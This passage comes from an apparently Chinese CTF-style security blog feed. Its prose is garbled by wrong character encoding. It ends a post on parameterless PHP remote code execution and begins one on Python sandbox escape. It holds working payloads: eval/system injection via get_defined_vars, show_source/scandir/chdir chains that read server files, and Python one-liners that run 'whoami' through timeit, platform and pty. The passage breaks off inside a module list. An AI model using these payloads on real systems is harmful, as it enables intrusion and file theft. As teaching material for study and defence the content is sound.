class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br></code></pre></td></tr></table></figure><p>å‡å¦‚è¯´åŸæœ¬åªæœ‰ä¸€ä¸ªå‚æ•°aï¼Œé‚£ä¹ˆå¯ä»¥å¤šåŠ ä¸€ä¸ªå‚æ•°bï¼Œåé¢å†™å…¥æ¶æ„è¯­å¥ï¼Œpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æŠŠevalæ¢æˆassertä¹Ÿè¡Œ ï¼Œèƒ½æ‰§è¡Œsystem(â€˜ls &#x2F;â€˜)å°±è¡Œ</p><h3 id="æ–¹æ³•äº”ï¼šchdir-array-rand-èµŒç‹—è¯»æ–‡ä»¶"><a href="#æ–¹æ³•äº”ï¼šchdir-array-rand-èµŒç‹—è¯»æ–‡ä»¶" class="headerlink" title="æ–¹æ³•äº”ï¼šchdir()&amp;array_rand()èµŒç‹—è¯»æ–‡ä»¶"></a>æ–¹æ³•äº”ï¼šchdir()&amp;array_rand()èµŒç‹—è¯»æ–‡ä»¶</h3><p>å®åœ¨æ— æ³•rceï¼Œå¯ä»¥è€ƒè™‘ç›®å½•éå†è¿›è¡Œæ–‡ä»¶è¯»å–</p><p>åˆ©ç”¨<code>getcwd()</code>è·å–å½“å‰ç›®å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getcwd</span>());<br></code></pre></td></tr></table></figure><p>ç»“åˆdirname()åˆ—å‡ºå½“å‰å·¥ä½œç›®å½•çš„çˆ¶ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br></code></pre></td></tr></table></figure><p> è¯»ä¸Šä¸€çº§æ–‡ä»¶åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br><br>?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<br><br>?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<br></code></pre></td></tr></table></figure><p>è¯»æ ¹ç›®å½•:</p><p>ord() å‡½æ•°å’Œ chr() å‡½æ•°ï¼šåªèƒ½å¯¹ç¬¬ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè½¬ç ï¼Œord() ç¼–ç ï¼Œchr)è§£ç ï¼Œæœ‰æ¦‚ç‡ä¼šè§£ç å‡ºæ–œæ è¯»å–æ ¹ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))));<br></code></pre></td></tr></table></figure><p>è¦ç”¨chdir()å›ºå®šï¼Œpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>() )))))))))));<br></code></pre></td></tr></table></figure><p>é€šè¿‡bpçš„intruderæ¨¡å—æ¥è¯»åˆ°æ ¹ç›®å½•ï¼š</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202327073.png" class title="image-20250129202327073"><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202339375.png" class title="image-20250129202339375"><p>æ–‡ç« å‚è€ƒï¼š<br><a href="https://blog.csdn.net/2301_76690905/article/details/133808536">https://blog.csdn.net/2301_76690905/article/details/133808536</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pythonæ²™ç®±é€ƒé€¸</title>
    <link href="/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <url>/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h2 id="æ‰§è¡Œæ¨¡å—"><a href="#æ‰§è¡Œæ¨¡å—" class="headerlink" title="æ‰§è¡Œæ¨¡å—"></a>æ‰§è¡Œæ¨¡å—</h2><p>åœ¨Pythonä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼æœ‰</p><ul><li>os</li><li>commandsï¼šä»…é™<code>2.x</code></li><li>subprocessï¼šsubprocess.getoutput(â€œwhoamiâ€),print(a);subprocess.run(â€œwhoamiâ€)</li><li>timeitï¼štimeit.sysï¼Œ<code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)</code></li><li>platformï¼šplatform.osï¼Œplatform.sysï¼Œplatform.popen(â€˜whoamiâ€™, mode&#x3D;â€™râ€™, bufsize&#x3D;-1).read()</li><li>ptyï¼špty.spawn(â€˜lsâ€™)ï¼Œpty.os</li><li>bdbï¼šbdb.osï¼Œcgi.sys</li><li>cgiï¼šcgi.osï¼Œcgi.sys</li><li>â€¦.</li></ul><p>ä¸‹é¢æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œè·‘å‡ºäº†å…¶ä¸­å¯¼å…¥osæˆ–è€…sysè¿˜æœ‰<code>__builtins__</code>çš„åº“ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python">all_modules_Python2 = [<br>    <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;Bastion&#x27;</span>, <span class="hljs-string">&#x27;anydbm&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;CDROM&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;Canvas&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;ConfigParser&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;Cookie&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;DLFCN&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;Dialog&#x27;</span>, <span class="hljs-string">&#x27;audiodev&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;FileDialog&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;lib2to3&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;FixTk&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;HTMLParser&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;linuxaudiodev&#x27;</span>, <span class="hljs-string">&#x27;sre&#x27;</span>, <span class="hljs-string">&#x27;IN&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;MimeWriter&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;Queue&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;ScrolledText&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;SimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;cPickle&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;statvfs&#x27;</span>, <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;cStringIO&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;markupbase&#x27;</span>, <span class="hljs-string">&#x27;stringold&#x27;</span>, <span class="hljs-string">&#x27;StringIO&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;TYPES&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;strop&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;Tkconstants&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;Tkdnd&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;Tkinter&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;sunaudio&#x27;</span>, <span class="hljs-string">&#x27;UserDict&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mimify&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;UserList&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;UserString&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_LWPCookieJar&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multifile&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="hljs-string">&#x27;commands&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;mutex&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;compiler&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;talloc&#x27;</span>, <span class="hljs-string">&#x27;_abcoll&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;cookielib&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_bsddb&#x27;</span>, <span class="hljs-string">&#x27;copy_reg&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;thread&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;dbhash&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;os2emxpath&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;tkColorChooser&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;tkCommonDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;tkFileDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tkFont&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tkMessageBox&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;tkSimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;toaiff&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>, <span class="hljs-string">&#x27;_hashlib&#x27;</span>, <span class="hljs-string">&#x27;dummy_threading&#x27;</span>, <span class="hljs-string">&#x27;plistlib&#x27;</span>, <span class="hljs-string">&#x27;tokenize&#x27;</span>, <span class="hljs-string">&#x27;_heapq&#x27;</span>, <span class="hljs-string">&#x27;email&#x27;</span>, <span class="hljs-string">&#x27;popen2&#x27;</span>, <span class="hljs-string">&#x27;trace&#x27;</span>, <span class="hljs-string">&#x27;_hotshot&#x27;</span>, <span class="hljs-string">&#x27;encodings&#x27;</span>, <span class="hljs-string">&#x27;poplib&#x27;</span>, <span class="hljs-string">&#x27;traceback&#x27;</span>, <span class="hljs-string">&#x27;_io&#x27;</span>, <span class="hljs-string">&#x27;ensurepip&#x27;</span>, <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;ttk&#x27;</span>, <span class="hljs-string">&#x27;_json&#x27;</span>, <span class="hljs-string">&#x27;errno&#x27;</span>, <span class="hljs-string">&#x27;posixfile&#x27;</span>, <span class="hljs-string">&#x27;tty&#x27;</span>, <span class="hljs-string">&#x27;_locale&#x27;</span>, <span class="hljs-string">&#x27;exceptions&#x27;</span>, <span class="hljs-string">&#x27;posixpath&#x27;</span>, <span class="hljs-string">&#x27;turtle&#x27;</span>, <span class="hljs-string">&#x27;_lsprof&#x27;</span>, <span class="hljs-string">&#x27;fcntl&#x27;</span>, <span class="hljs-string">&#x27;pprint&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;_md5&#x27;</span>, <span class="hljs-string">&#x27;filecmp&#x27;</span>, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-string">&#x27;unicodedata&#x27;</span>, <span class="hljs-string">&#x27;_multibytecodec&#x27;</span>, <span class="hljs-string">&#x27;fileinput&#x27;</span>, <span class="hljs-string">&#x27;pstats&#x27;</span>, <span class="hljs-string">&#x27;unittest&#x27;</span>, <span class="hljs-string">&#x27;_multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;fnmatch&#x27;</span>, <span class="hljs-string">&#x27;pty&#x27;</span>, <span class="hljs-string">&#x27;urllib&#x27;</span>, <span class="hljs-string">&#x27;_osx_support&#x27;</span>, <span class="hljs-string">&#x27;formatter&#x27;</span>, <span class="hljs-string">&#x27;pwd&#x27;</span>, <span class="hljs-string">&#x27;urllib2&#x27;</span>, <span class="hljs-string">&#x27;_pyio&#x27;</span>, <span class="hljs-string">&#x27;fpformat&#x27;</span>, <span class="hljs-string">&#x27;py_compile&#x27;</span>, <span class="hljs-string">&#x27;urlparse&#x27;</span>, <span class="hljs-string">&#x27;_random&#x27;</span>, <span class="hljs-string">&#x27;fractions&#x27;</span>, <span class="hljs-string">&#x27;pyclbr&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>, <span class="hljs-string">&#x27;_sha&#x27;</span>, <span class="hljs-string">&#x27;ftplib&#x27;</span>, <span class="hljs-string">&#x27;pydoc&#x27;</span>, <span class="hljs-string">&#x27;uu&#x27;</span>, <span class="hljs-string">&#x27;_sha256&#x27;</span>, <span class="hljs-string">&#x27;functools&#x27;</span>, <span class="hljs-string">&#x27;pydoc_data&#x27;</span>, <span class="hljs-string">&#x27;uuid&#x27;</span>, <span class="hljs-string">&#x27;_sha512&#x27;</span>, <span class="hljs-string">&#x27;future_builtins&#x27;</span>, <span class="hljs-string">&#x27;pyexpat&#x27;</span>, <span class="hljs-string">&#x27;warnings&#x27;</span>, <span class="hljs-string">&#x27;_socket&#x27;</span>, <span class="hljs-string">&#x27;gc&#x27;</span>, <span class="hljs-string">&#x27;quopri&#x27;</span>, <span class="hljs-string">&#x27;wave&#x27;</span>, <span class="hljs-string">&#x27;_sqlite3&#x27;</span>, <span class="hljs-string">&#x27;genericpath&#x27;</span>, <span class="hljs-string">&#x27;random&#x27;</span>, <span class="hljs-string">&#x27;weakref&#x27;</span>, <span class="hljs-string">&#x27;_sre&#x27;</span>, <span class="hljs-string">&#x27;getopt&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;webbrowser&#x27;</span>, <span class="hljs-string">&#x27;_ssl&#x27;</span>, <span class="hljs-string">&#x27;getpass&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;whichdb&#x27;</span>, <span class="hljs-string">&#x27;_strptime&#x27;</span>, <span class="hljs-string">&#x27;gettext&#x27;</span>, <span class="hljs-string">&#x27;repr&#x27;</span>, <span class="hljs-string">&#x27;wsgiref&#x27;</span>, <span class="hljs-string">&#x27;_struct&#x27;</span>, <span class="hljs-string">&#x27;glob&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;xdrlib&#x27;</span>, <span class="hljs-string">&#x27;_symtable&#x27;</span>, <span class="hljs-string">&#x27;grp&#x27;</span>, <span class="hljs-string">&#x27;rexec&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;rfc822&#x27;</span>, <span class="hljs-string">&#x27;xmllib&#x27;</span>, <span class="hljs-string">&#x27;_sysconfigdata_nd&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;xmlrpclib&#x27;</span>, <span class="hljs-string">&#x27;_testcapi&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span>, <span class="hljs-string">&#x27;robotparser&#x27;</span>, <span class="hljs-string">&#x27;xxsubtype&#x27;</span>, <span class="hljs-string">&#x27;_threading_local&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;zipfile&#x27;</span>, <span class="hljs-string">&#x27;_warnings&#x27;</span>, <span class="hljs-string">&#x27;hotshot&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakref&#x27;</span>, <span class="hljs-string">&#x27;htmlentitydefs&#x27;</span>, <span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;htmllib&#x27;</span>, <span class="hljs-string">&#x27;sets&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;httplib&#x27;</span>, <span class="hljs-string">&#x27;sgmllib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;ihooks&#x27;</span>, <span class="hljs-string">&#x27;sha&#x27;</span><br>]<br><br>all_modules_Python3 = [<br>    <span class="hljs-string">&#x27;AptUrl&#x27;</span>, <span class="hljs-string">&#x27;hmac&#x27;</span>, <span class="hljs-string">&#x27;requests_unixsocket&#x27;</span>, <span class="hljs-string">&#x27;CommandNotFound&#x27;</span>, <span class="hljs-string">&#x27;apport&#x27;</span>, <span class="hljs-string">&#x27;hpmudext&#x27;</span>, <span class="hljs-string">&#x27;resource&#x27;</span>, <span class="hljs-string">&#x27;Crypto&#x27;</span>, <span class="hljs-string">&#x27;apport_python_hook&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-string">&#x27;rlcompleter&#x27;</span>, <span class="hljs-string">&#x27;DistUpgrade&#x27;</span>, <span class="hljs-string">&#x27;apt&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>, <span class="hljs-string">&#x27;runpy&#x27;</span>, <span class="hljs-string">&#x27;HweSupportStatus&#x27;</span>, <span class="hljs-string">&#x27;apt_inst&#x27;</span>, <span class="hljs-string">&#x27;httplib2&#x27;</span>, <span class="hljs-string">&#x27;scanext&#x27;</span>, <span class="hljs-string">&#x27;LanguageSelector&#x27;</span>, <span class="hljs-string">&#x27;apt_pkg&#x27;</span>, <span class="hljs-string">&#x27;idna&#x27;</span>, <span class="hljs-string">&#x27;sched&#x27;</span>, <span class="hljs-string">&#x27;NvidiaDetector&#x27;</span>, <span class="hljs-string">&#x27;aptdaemon&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;secrets&#x27;</span>, <span class="hljs-string">&#x27;PIL&#x27;</span>, <span class="hljs-string">&#x27;aptsources&#x27;</span>, 